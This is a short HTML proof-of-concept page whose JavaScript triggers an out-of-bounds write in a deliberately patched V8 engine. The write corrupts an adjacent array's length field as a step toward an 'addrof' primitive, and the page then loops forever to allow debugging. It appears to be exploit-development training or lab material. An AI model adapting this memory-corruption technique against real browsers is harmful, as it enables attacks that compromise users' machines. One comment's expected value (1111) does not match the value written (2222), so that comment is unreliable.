<!DOCTYPE html>
<html>
    <body>
        <script>
// This POC demonstrates using the out-of-bounds write introduced by v8_bug.patch
// to create an addrof primitive.
let y = new Uint32Array(1);
// y = [ y0 ]

let x = new Uint32Array(1);
// x = [ x0 ]

let z = [1.1, 1.1, 1.1, 1.1];
// z = [ 1.1 | 1.1 | 1.1 | 1.1 ]

y.set([2222], 0);
// y = [ 2222 ]

x.set(y, 33);
// offset 33 out-of-bounds -v
// x = [ x0 ] ... ... ... [ 2222 ] ... [ 1.1 | 1.1 | 1.1 | 1.1 ]
// array z's length metadata -^ 

console.log(z.length);
// verify that array z's length field has been overwritten to 1111

// introduce an infinite loop to permit debugging the renderer process
let i = 1;
while (i < 10) {
    x.set(y, 33);
}
        </script>
    </body>
</html>
